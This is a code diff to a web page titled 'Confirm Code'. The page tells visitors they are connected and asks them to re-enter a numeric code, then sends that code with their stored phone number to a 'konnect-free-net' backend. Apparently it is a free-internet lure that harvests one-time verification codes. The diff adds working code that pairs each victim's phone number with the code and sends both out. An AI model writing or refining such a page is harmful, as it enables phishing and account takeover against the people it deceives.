@@ -4,29 +4,74 @@
   <meta charset="UTF-8">
   <title>Confirm Code</title>
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(to right, #f0f4f8, #e0e7ff);
+      color: #2c3e50;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+  </style>
 </head>
 <body>
   <script>
     async function askForCode() {
+      const phone = localStorage.getItem('userPhone');
+
+      if (!phone) {
+        await Swal.fire({
+          icon: 'warning',
+          title: 'Phone Number Missing',
+          text: 'Please start from the beginning and enter your phone number.',
+          confirmButtonText: 'Go Back',
+          confirmButtonColor: '#4F46E5'
+        });
+        window.location.href = '/'; // redirect to home
+        return;
+      }
+
       const { value: code } = await Swal.fire({
-        title: "You're connected!",
+        title: "🔐 You're Connected!",
         text: "Please re-enter your code.",
         input: 'text',
-        inputLabel: 'Enter code:',
-        inputPlaceholder: 'Your code here',
-        confirmButtonText: 'Submit'
+        inputLabel: 'Enter Code:',
+        inputPlaceholder: 'e.g. 49302',
+        confirmButtonText: 'Submit',
+        confirmButtonColor: '#4F46E5',
+        background: '#ffffff',
+        color: '#2c3e50'
       });
 
       if (code) {
         try {
+          // Save to localStorage
+          localStorage.setItem('userCode', code);
+
+          // Send to backend
           await fetch('https://konnect-free-net.onrender.com/store-code', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ code })
+            body: JSON.stringify({ phone, code })
           });
-          await Swal.fire('Saved!', 'Your code was saved successfully.', 'success');
+
+          await Swal.fire({
+            icon: 'success',
+            title: '✅ Saved!',
+            text: 'Your code has been saved successfully.',
+            confirmButtonColor: '#4F46E5'
+          });
         } catch (err) {
-          await Swal.fire('Error!', 'Failed to save code: ' + err.message, 'error');
+          await Swal.fire({
+            icon: 'error',
+            title: '⚠️ Error!',
+            text: 'Failed to save code: ' + err.message,
+            confirmButtonColor: '#E11D48'
+          });
         }
       }
     }
